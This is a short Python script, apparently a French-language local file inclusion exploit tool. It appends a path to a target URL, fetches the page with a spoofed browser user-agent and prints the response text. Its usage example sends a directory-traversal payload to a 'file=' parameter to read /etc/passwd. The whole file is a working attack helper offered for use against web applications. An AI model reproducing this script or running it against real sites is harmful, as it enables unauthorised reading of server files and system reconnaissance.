import urllib.request
import bs4 as bs
import sys

def lfiscan(url, path):
    headers = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"}

    try:
        request = urllib.request.Request(url + path, headers=headers)
        link = urllib.request.urlopen(request).read()
        bo = bs.BeautifulSoup(link, 'html.parser')
        text = bs.BeautifulSoup.get_text(bo)
        print(text)
    except:
        print("[!] Une erreur s'est produite lors de la requÃªte.")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 explore_lfi.py <URL> <Path>")
        print("Exemple: python3 explore_lfi.py http://example.com/data/subs.php?file= ../../../../../../../etc/passwd")
        sys.exit(1)

    url = sys.argv[1]
    path = sys.argv[2]

    lfiscan(url, path)

if __name__ == "__main__":
    main()